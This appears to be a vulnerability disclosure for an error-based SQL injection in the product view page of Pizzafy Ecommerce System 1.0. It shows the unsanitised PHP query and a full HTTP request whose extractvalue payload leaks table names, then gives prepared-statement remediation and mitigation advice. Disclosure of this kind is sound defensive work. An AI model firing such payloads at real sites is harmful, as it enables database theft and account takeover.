
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `/pizzafy/view_prod.php?id=3`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in SELECT Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **select functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `id` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
$id = $_GET['id'];

$qry = $conn->query("SELECT * FROM product_list WHERE id = $id");

if (!$qry) {
    echo $conn->error;
    exit;
}
```

Below is a **GET** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  

```
GET /pizzafy/view_prod.php?id=9%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20-- HTTP/1.1
Host: localhost
sec-ch-ua: 
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizzafy/index.php?page=home
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __SRMS__logged=2; __SRMS__key=206b8e5962b2c723e98fba4bbeec7eaaec379ecee8f8d585d60cb304bf6d87ec; PHPSESSID=cibugvssqjpg73n0grv4fbg9lf
Connection: close
```

### **Explanation:**  
This payload injects the SQL command:  

```sql
9%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20-- 
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/f4BZDJR.png)
---

## Remediation
```php

try {
    $id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
    
    if($id === false || $id === null || $id <= 0) {
        throw new Exception("Invalid.");
    }
    
    $stmt = $conn->prepare("SELECT * FROM product_list WHERE id = ?");
    if(!$stmt) {
        throw new Exception("Error.");
    }
    
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if($result && $result->num_rows > 0){
        $prod = $result->fetch_assoc();
    } else {
        throw new Exception("Product not found.");
    }
    
} catch (Exception $e) {
    error_log("Erro: " . $e->getMessage() . " - ID: " . $id);
    echo $e->getMessage();
    exit;
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `id` parameter to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet
